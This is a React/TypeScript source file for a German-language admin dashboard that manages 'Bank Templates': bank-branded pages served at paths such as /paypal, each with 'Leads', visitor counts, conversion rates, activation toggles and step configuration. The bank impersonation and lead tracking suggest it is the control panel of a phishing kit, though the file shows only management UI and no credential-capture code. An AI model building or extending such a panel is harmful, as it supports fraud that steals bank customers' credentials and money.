import React, { useState, useEffect } from 'react';
import { Power, Edit, Loader, ExternalLink, Plus, Settings, FileText } from 'lucide-react';
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';
import { templateAPI } from '../utils/api';
import { useAuth } from '../context/AuthContext';
import { StepConfigEditor } from '../components/StepConfigEditor';
import { preloadCriticalImages } from '../utils/imagePreloader';
import { BankIcon } from '../utils/bankIcons';

interface Template {
  id: number;
  name: string;
  folder_name: string;
  is_active: number;
  description: string;
  template_type: string;
  created_at: string;
  last_modified: string;
}

interface TemplateWithStats extends Template {
  leads: number;
  visitors: number;
  conversionRate: number;
}

export const BankTemplates: React.FC = () => {
  const queryClient = useQueryClient();
  const { logout } = useAuth();
  const [editingTemplate, setEditingTemplate] = useState<Template | null>(null);
  const [showCreateModal, setShowCreateModal] = useState(false);
  const [stepConfigTemplate, setStepConfigTemplate] = useState<Template | null>(null);

  // Preload bank icons when component mounts
  useEffect(() => {
    preloadCriticalImages();
  }, []);

  // Fetch bank templates with real statistics
  const { data: templatesWithStats, isLoading, error } = useQuery<TemplateWithStats[]>({
    queryKey: ['bank-templates-with-stats'],
    queryFn: () => templateAPI.getTemplatesWithStats('bank'),
    refetchInterval: 30000, // Refresh every 30 seconds for real-time updates
  });

  // Handle authentication errors
  React.useEffect(() => {
    if (error && (error as any).message === 'UNAUTHORIZED') {
      logout();
    }
  }, [error, logout]);

  // Toggle template active status
  const toggleStatusMutation = useMutation({
    mutationFn: templateAPI.toggleStatus,
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['bank-templates-with-stats'] });
    },
    onError: (error: any) => {
      console.error('Toggle status error:', error);
      if (error.message === 'UNAUTHORIZED') {
        logout();
      } else {
        alert(`Fehler beim Ändern des Bank Template Status: ${error.message}`);
      }
    }
  });

  // Update template
  const updateTemplateMutation = useMutation({
    mutationFn: ({ id, updates }: { id: number; updates: Partial<Template> }) => 
      templateAPI.updateTemplate(id, updates),
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['bank-templates-with-stats'] });
      setEditingTemplate(null);
    },
    onError: (error: any) => {
      console.error('Update template error:', error);
      if (error.message === 'UNAUTHORIZED') {
        logout();
      } else {
        alert(`Fehler beim Aktualisieren des Bank Templates: ${error.message}`);
      }
    }
  });

  // Handle actions
  const handleToggleStatus = (templateId: number) => {
    toggleStatusMutation.mutate(templateId);
  };

  const handleEdit = (template: Template) => {
    setEditingTemplate(template);
  };

  const handleUpdateTemplate = (updates: Partial<Template>) => {
    if (editingTemplate) {
      updateTemplateMutation.mutate({ id: editingTemplate.id, updates });
    }
  };

  // Get template URL for preview
  const getTemplateUrl = (folderName: string) => {
    return `${window.location.origin}/${folderName}`;
  };


  return (
    <div className="space-y-6">
      <div className="flex justify-between items-center">
        <div>
          <h1 className="text-3xl font-bold text-gray-900">Bank Templates</h1>
          <p className="text-gray-600 mt-1">Verwalten Sie Ihre Banking-Templates und deren Performance</p>
        </div>
        <button 
          onClick={() => setShowCreateModal(true)}
          className="flex items-center gap-2 px-4 py-2 bg-red-600 text-white rounded-md hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-red-500 focus:ring-offset-2"
        >
          <Plus size={18} />
          Neues Bank Template
        </button>
      </div>

      {isLoading ? (
        <div className="flex justify-center items-center h-40">
          <Loader className="animate-spin h-8 w-8 text-red-600" />
          <span className="ml-2 text-gray-600">Lade Bank Templates...</span>
        </div>
      ) : error ? (
        <div className="bg-red-50 border border-red-200 rounded-lg p-4 text-red-700">
          Fehler beim Laden der Bank Templates. Bitte versuchen Sie es später erneut.
        </div>
      ) : (
        <div className="bg-white shadow rounded-lg">
          <div className="overflow-x-auto">
            <table className="min-w-full divide-y divide-gray-200">
              <thead className="bg-gray-50">
                <tr>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    Name
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    Pfad
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    Status
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    Performance
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    Typ
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    Erstellt am
                  </th>
                  <th className="px-6 py-3 text-right text-xs font-medium text-gray-500 uppercase tracking-wider">
                    Aktionen
                  </th>
                </tr>
              </thead>
              <tbody className="bg-white divide-y divide-gray-200">
                {!templatesWithStats || templatesWithStats.length === 0 ? (
                  <tr>
                    <td colSpan={7} className="px-6 py-8 text-center text-gray-500">
                      <div className="flex flex-col items-center">
                        <FileText className="h-12 w-12 text-gray-300 mb-4" />
                        <p className="text-lg font-medium text-gray-900 mb-2">Keine Bank Templates gefunden</p>
                        <p className="text-gray-500 mb-4">Erstellen Sie Ihr erstes Bank Template, um loszulegen.</p>
                        <button 
                          onClick={() => setShowCreateModal(true)}
                          className="flex items-center gap-2 px-4 py-2 bg-red-600 text-white rounded-md hover:bg-red-700"
                        >
                          <Plus size={16} />
                          Erstes Bank Template erstellen
                        </button>
                      </div>
                    </td>
                  </tr>
                ) : (
                  templatesWithStats?.map((template: TemplateWithStats) => (
                  <tr key={template.id} className="hover:bg-gray-50">
                    <td className="px-6 py-4 whitespace-nowrap">
                      <div className="flex items-center">
                        <div className="flex-shrink-0 h-10 w-10 rounded-lg border border-gray-200 bg-white flex items-center justify-center shadow-sm">
                          <BankIcon templateName={template.folder_name} size="lg" />
                        </div>
                        <div className="ml-4">
                          <div className="text-sm font-medium text-gray-900">{template.name}</div>
                          <div className="text-xs text-gray-500">{template.description}</div>
                        </div>
                      </div>
                    </td>
                    <td className="px-6 py-4 whitespace-nowrap">
                      <div className="flex items-center gap-2">
                        <code className="text-sm text-gray-900 bg-gray-100 px-2 py-1 rounded">
                          /{template.folder_name}
                        </code>
                        <a
                          href={getTemplateUrl(template.folder_name)}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="text-red-600 hover:text-red-900"
                          title="Bank Template in neuem Tab öffnen"
                        >
                          <ExternalLink size={14} />
                        </a>
                      </div>
                    </td>
                    <td className="px-6 py-4 whitespace-nowrap">
                      <div className="flex items-center space-x-2">
                        <span
                          className={`px-3 py-1 inline-flex text-xs leading-5 font-semibold rounded-full ${
                            template.is_active === 1
                              ? 'bg-green-100 text-green-800'
                              : 'bg-red-100 text-red-800'
                          }`}
                        >
                          {template.is_active === 1 ? 'Aktiv' : 'Deaktiviert'}
                        </span>
                        {template.is_active === 0 && (
                          <span className="text-xs text-gray-500 italic">
                            (Zugriff blockiert)
                          </span>
                        )}
                      </div>
                    </td>
                    <td className="px-6 py-4 whitespace-nowrap">
                      <div className="text-sm text-gray-900">
                        <div className="font-medium">{template.leads} Leads</div>
                        <div className="text-xs text-gray-500">
                          {template.visitors} Besucher • {template.conversionRate}% Konversion
                        </div>
                      </div>
                    </td>
                    <td className="px-6 py-4 whitespace-nowrap">
                      <span className="px-2 py-1 text-xs font-medium bg-red-100 text-red-800 rounded-full">
                        Bank Template
                      </span>
                    </td>
                    <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                      {new Date(template.created_at).toLocaleDateString('de-DE')}
                    </td>
                    <td className="px-6 py-4 whitespace-nowrap text-right text-sm font-medium">
                      <div className="flex justify-end space-x-2">
                        <button 
                          onClick={() => handleToggleStatus(template.id)}
                          className={`p-2 rounded-md transition-colors ${
                            template.is_active === 1 
                              ? 'text-red-600 hover:text-red-900 hover:bg-red-50' 
                              : 'text-green-600 hover:text-green-900 hover:bg-green-50'
                          }`}
                          title={template.is_active === 1 ? 'Bank Template deaktivieren' : 'Bank Template aktivieren'}
                          disabled={toggleStatusMutation.isPending}
                        >
                          {toggleStatusMutation.isPending ? (
                            <Loader className="animate-spin h-4 w-4" />
                          ) : (
                            <Power size={18} />
                          )}
                        </button>
                        <button 
                          onClick={() => handleEdit(template)}
                          className="p-2 text-gray-600 hover:text-gray-900 hover:bg-gray-50 rounded-md transition-colors"
                          title="Bank Template bearbeiten"
                        >
                          <Edit size={18} />
                        </button>
                        <button 
                          onClick={() => setStepConfigTemplate(template)}
                          className="p-2 text-gray-600 hover:text-gray-900 hover:bg-gray-50 rounded-md transition-colors"
                          title="Schritt-Konfiguration"
                        >
                          <Settings size={18} />
                        </button>
                      </div>
                    </td>
                  </tr>
                )))}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* Edit Template Modal */}
      {editingTemplate && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white rounded-lg p-6 w-full max-w-md">
            <h3 className="text-lg font-medium text-gray-900 mb-4">Bank Template bearbeiten</h3>
            <form onSubmit={(e) => {
              e.preventDefault();
              const formData = new FormData(e.currentTarget);
              handleUpdateTemplate({
                name: formData.get('name') as string,
                description: formData.get('description') as string,
              });
            }}>
              <div className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700">Name</label>
                  <input
                    name="name"
                    type="text"
                    defaultValue={editingTemplate.name}
                    className="mt-1 block w-full border-gray-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500"
                    required
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700">Beschreibung</label>
                  <textarea
                    name="description"
                    defaultValue={editingTemplate.description}
                    rows={3}
                    className="mt-1 block w-full border-gray-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500"
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700">Ordnername</label>
                  <input
                    type="text"
                    value={editingTemplate.folder_name}
                    disabled
                    className="mt-1 block w-full border-gray-300 rounded-md shadow-sm bg-gray-100 text-gray-500"
                  />
                  <p className="text-xs text-gray-500 mt-1">Der Ordnername kann nicht geändert werden</p>
                </div>
              </div>
              <div className="mt-6 flex justify-end space-x-3">
                <button
                  type="button"
                  onClick={() => setEditingTemplate(null)}
                  className="px-4 py-2 border border-gray-300 rounded-md text-sm font-medium text-gray-700 hover:bg-gray-50"
                >
                  Abbrechen
                </button>
                <button
                  type="submit"
                  disabled={updateTemplateMutation.isPending}
                  className="px-4 py-2 bg-red-600 text-white rounded-md text-sm font-medium hover:bg-red-700 disabled:opacity-50"
                >
                  {updateTemplateMutation.isPending ? 'Speichern...' : 'Speichern'}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Create Template Modal */}
      {showCreateModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white rounded-lg p-6 w-full max-w-md">
            <h3 className="text-lg font-medium text-gray-900 mb-4">Neues Bank Template erstellen</h3>
            <form onSubmit={(e) => {
              e.preventDefault();
              // This would create a new landing page - for now just close modal
              setShowCreateModal(false);
              alert('Bank Template-Erstellung wird in einer zukünftigen Version implementiert');
            }}>
              <div className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">Name</label>
                  <input
                    name="name"
                    type="text"
                    placeholder="z.B. PayPal Gateway"
                    className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500 text-sm bg-white hover:border-gray-400 transition-colors"
                    required
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">Ordnername</label>
                  <input
                    name="folder_name"
                    type="text"
                    placeholder="z.B. paypal"
                    className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500 text-sm bg-white hover:border-gray-400 transition-colors"
                    required
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">Beschreibung</label>
                  <textarea
                    name="description"
                    placeholder="Beschreibung des Bank Templates"
                    rows={3}
                    className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500 text-sm bg-white hover:border-gray-400 transition-colors"
                  />
                </div>
              </div>
              <div className="mt-6 flex justify-end space-x-3">
                <button
                  type="button"
                  onClick={() => setShowCreateModal(false)}
                  className="px-4 py-2 border border-gray-300 rounded-md text-sm font-medium text-gray-700 hover:bg-gray-50"
                >
                  Abbrechen
                </button>
                <button
                  type="submit"
                  className="px-4 py-2 bg-red-600 text-white rounded-md text-sm font-medium hover:bg-red-700"
                >
                  Erstellen
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Step Configuration Modal */}
      {stepConfigTemplate && (
        <StepConfigEditor
          templateId={stepConfigTemplate.id}
          templateName={stepConfigTemplate.name}
          isOpen={!!stepConfigTemplate}
          onClose={() => setStepConfigTemplate(null)}
        />
      )}
    </div>
  );
};